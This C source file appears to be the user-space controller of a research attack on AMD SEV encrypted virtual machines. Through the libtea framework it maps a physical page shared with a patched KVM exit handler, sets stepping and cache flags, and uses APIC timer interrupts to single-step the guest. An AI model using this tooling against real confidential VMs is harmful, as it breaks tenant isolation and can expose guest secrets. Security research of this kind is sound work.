#include "../frameworks/libtea/libtea.h"
#include <inttypes.h>

#define ASSIST_CORE 1
#define ISOLATED_CPU_CORE 7 
#define KERNEL_SYNC_PA 0x1FEE01000

#define INSTR_MONITOR(x) asm volatile("monitorx" : : "a"(x), "c"(0), "d"(0));
#define INSTR_WAIT asm volatile("mwaitx;" : : "a"(-1), "c"(0));

uint64_t flag, additional_flag = 0;
void *sev_step_kernel_sync_addr_p;

void pin_to_core(int core) { cpu_set_t cpuset; pthread_t thread;

	thread = pthread_self();

	CPU_ZERO(&cpuset); 
	CPU_SET(core, &cpuset);

	pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset); 
}

void* ctrl_thread(void* dummy) { 
	
	pin_to_core(ASSIST_CORE);

	// hook kvm_exit_handler in the kernel 
	asm volatile ("movq %1, (%0)\n"::"r"(sev_step_kernel_sync_addr_p),"r"(flag):);

	/* Wait until the attack finishes */
	while (*(uint32_t*)(sev_step_kernel_sync_addr_p)) {}
}


int main(int argc, char **argv){

	if (argc < 5) { 
	    printf("Usage: <apic_interval> <non_zero_steps> <filter_set_index> <stop>\n"); 
	    exit(0); 
	}

	/* parse */
	uint64_t interval = strtol(argv[1], NULL, 0); 
	uint64_t step_num = strtol(argv[2], NULL, 0); 
	uint64_t set_idx  = strtol(argv[3], NULL, 0);
	int stop = atoi(argv[4]);

	/* libtea init */
	libtea_instance* instance = libtea_init(); 
	if(!instance){
	    libtea_info("Libtea test init failed."); 
	    return 1; 
	}
	libtea_pin_to_core(getpid(), ISOLATED_CPU_CORE);
	libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x03);

  /* REMAP A RANGE OF MEMORY TO SYNC WITH EXIT HANDLER IN KERNEL */
  sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, 4096, PROT_READ | PROT_WRITE, true);
  memset(sev_step_kernel_sync_addr_p, 0, 4096);
  
  if (stop) {
	/* CLEAN */
  	exit(0);
  }


#define DEC        0 
#define UC_VMSA    0
#define INVD       1 
#define NO_STEP    0 

// step_num: Number of non-zero steps we want to perform
// interval: APIC interval writing to TMICT at the end of NPF handler 
// DEC: Flag of whether need to decrypt VMSA (Only debug, now we dont boot VM with -allow-debug)
// UC_VMSA: Mark VMSA into uncacheable
// INVD: Invalidate cache after VM breaks (when we find the target)
// NO_STEP: Do not care the stepping is zero step or not (i.e., do not observe VMSA)
// 0x77: Hook Switch
  flag = (step_num << 32) + (interval << 16) + (DEC << 8) + (UC_VMSA << 9) + (INVD << 10) + (NO_STEP << 11) + 0x77;

  /* Write the target set (will not start the hook in exit_handler) */
  asm volatile ("movq %1, (%0)\n\t":: "r"(sev_step_kernel_sync_addr_p+8),"r"(set_idx):);



#define WBNOINVD 0
#define WBINVD   1

#define ZS_TLB_FLUSH 0 

  additional_flag = WBNOINVD + (ZS_TLB_FLUSH << 3);
  asm volatile ("movq %1, (%0)\n"::"r"(sev_step_kernel_sync_addr_p+3096),"r"(additional_flag):);

  pthread_t p;
  pthread_create(&p, NULL, ctrl_thread, NULL);
  sched_yield();

  /* Setting APIC_TDR_DIV_2
   * AMD use oneshot mode by default
   * 0xec is the default idx
   * */
  //libtea_apic_timer_oneshot(instance, 0xec);
  libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x0);

  pthread_join(p, NULL);

  /* RESUME APIC REGISTERS */
  libtea_apic_write(instance, LIBTEA_APIC_TDCR, 0x03);
  libtea_apic_set_timer_unsafe(0x6000); // 
  libtea_apic_lvtt = libtea_apic_tdcr = 0; 

libtea_test_interrupts_cleanup:
  libtea_cleanup(instance);

  return 0;
}

